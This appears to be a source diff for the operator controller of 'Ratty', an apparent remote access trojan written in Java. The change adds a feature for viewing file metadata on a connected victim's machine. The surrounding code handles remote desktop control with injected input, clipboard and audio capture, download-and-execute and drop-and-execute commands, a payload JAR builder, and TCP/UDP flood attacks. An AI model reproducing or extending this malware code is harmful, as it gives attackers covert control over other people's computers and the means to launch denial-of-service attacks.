@@ -1,4 +1,4 @@
-package de.sogomn.rat.server.gui;
+package de.sogomn.rat.gui.server;
 
 import static de.sogomn.rat.Ratty.LANGUAGE;
 
@@ -6,6 +6,7 @@ import java.awt.image.BufferedImage;
 import java.io.File;
 import java.io.IOException;
 import java.net.URL;
+import java.text.SimpleDateFormat;
 import java.util.HashMap;
 import java.util.Set;
 
@@ -19,6 +20,12 @@ import de.sogomn.engine.util.Scheduler;
 import de.sogomn.engine.util.Scheduler.Task;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.builder.JarBuilder;
+import de.sogomn.rat.gui.ChatWindow;
+import de.sogomn.rat.gui.DisplayPanel;
+import de.sogomn.rat.gui.FileTree;
+import de.sogomn.rat.gui.FileTreeNode;
+import de.sogomn.rat.gui.IGuiController;
+import de.sogomn.rat.gui.Notification;
 import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
@@ -29,6 +36,7 @@ import de.sogomn.rat.packet.DesktopPacket;
 import de.sogomn.rat.packet.DownloadFilePacket;
 import de.sogomn.rat.packet.DownloadUrlPacket;
 import de.sogomn.rat.packet.ExecuteFilePacket;
+import de.sogomn.rat.packet.FileInformationPacket;
 import de.sogomn.rat.packet.FileRequestPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
@@ -80,8 +88,9 @@ public final class RattyGuiController extends AbstractRattyController implements
 	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
-	private static final String OPTION_YES = LANGUAGE.getString("server.yes");
-	private static final String OPTION_CANCEL = LANGUAGE.getString("server.cancel");
+	private static final String YES = LANGUAGE.getString("server.yes");
+	private static final String NO = LANGUAGE.getString("server.no");
+	private static final String CANCEL = LANGUAGE.getString("server.cancel");
 	private static final String OPTION_TCP = LANGUAGE.getString("server.tcp");
 	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
 	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
@@ -90,6 +99,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
 	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
 	private static final String AMOUNT_QUESTION = LANGUAGE.getString("server.amount_question");
+	private static final String FILE_NAME = LANGUAGE.getString("file_information.name");
+	private static final String FILE_PATH = LANGUAGE.getString("file_information.path");
+	private static final String FILE_SIZE = LANGUAGE.getString("file_information.size");
+	private static final String FILE_DIRECTORY = LANGUAGE.getString("file_information.directory");
+	private static final String FILE_CREATION = LANGUAGE.getString("file_information.creation");
+	private static final String FILE_LAST_ACCESS = LANGUAGE.getString("file_information.last_access");
+	private static final String FILE_LAST_MODIFICATION = LANGUAGE.getString("file_information.last_modification");
+	private static final String FILE_BYTES = LANGUAGE.getString("file_information.bytes");
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
 	private static final float PING_INTERVAL = 3;
@@ -235,7 +252,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private FreePacket createFreePacket() {
-		final boolean accepted = gui.showWarning(FREE_WARNING, OPTION_YES, OPTION_CANCEL);
+		final boolean accepted = gui.showWarning(FREE_WARNING, YES, CANCEL);
 		
 		if (accepted) {
 			final FreePacket packet = new FreePacket();
@@ -258,6 +275,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 		
 		return null;
+	}
+	
+	private FileInformationPacket createFileInformationPacket(final ServerClient client) {
+		final FileTreeNode node = client.fileTree.getNodeClicked();
+		final String path = node.getPath();
+		final FileInformationPacket packet = new FileInformationPacket(path);
+		
+		return packet;
 	}
 	
 	private UploadFilePacket createUploadExecutePacket(final ServerClient client) {
@@ -353,7 +378,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void launchAttack() {
-		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, OPTION_CANCEL);
+		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, CANCEL);
 		
 		//AttackPacket packet = null;
 		
@@ -425,6 +450,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createDropExecutePacket(client);
 		} else if (command == ChatWindow.MESSAGE_SENT) {
 			packet = createChatPacket(client);
+		} else if (command == FileTree.INFORMATION) {
+			packet = createFileInformationPacket(client);
 		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
@@ -502,6 +529,33 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.chat.addLine(name + ": " + message);
 	}
 	
+	private void handleFileInformation(final ServerClient client, final FileInformationPacket packet) {
+		final String name = packet.getName();
+		final String path = packet.getPath();
+		final long size = packet.getSize();
+		final boolean directory = packet.isDirectory();
+		final long creationTime = packet.getCreationTime();
+		final long lastAccess = packet.getLastAccess();
+		final long lastModified = packet.getLastModified();
+		final SimpleDateFormat dateFormat = new SimpleDateFormat();
+		final String creationDate = dateFormat.format(creationTime);
+		final String lastAccessDate = dateFormat.format(lastAccess);
+		final String lastModificationDate = dateFormat.format(lastModified);
+		final String directoryString = directory ? YES : NO;
+		final StringBuilder builder = new StringBuilder();
+		final String message = builder
+				.append(FILE_NAME).append(": ").append(name).append("\r\n")
+				.append(FILE_PATH).append(": ").append(path).append("\r\n")
+				.append(FILE_SIZE).append(": ").append(size).append(" ").append(FILE_BYTES).append("\r\n")
+				.append(FILE_DIRECTORY).append(": ").append(directoryString).append("\r\n")
+				.append(FILE_CREATION).append(": ").append(creationDate).append("\r\n")
+				.append(FILE_LAST_ACCESS).append(": ").append(lastAccessDate).append("\r\n")
+				.append(FILE_LAST_MODIFICATION).append(": ").append(lastModificationDate)
+				.toString();
+		
+		gui.showMessage(message);
+	}
+	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
 		final Class<? extends IPacket> clazz = packet.getClass();
 		
@@ -535,6 +589,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 			final ChatPacket chat = (ChatPacket)packet;
 			
 			handleChatPacket(client, chat);
+		} else if (clazz == FileInformationPacket.class) {
+			final FileInformationPacket information = (FileInformationPacket)packet;
+			
+			handleFileInformation(client, information);
 		} else if (clazz == FreePacket.class) {
 			//To prevent shutdown
 		} else {
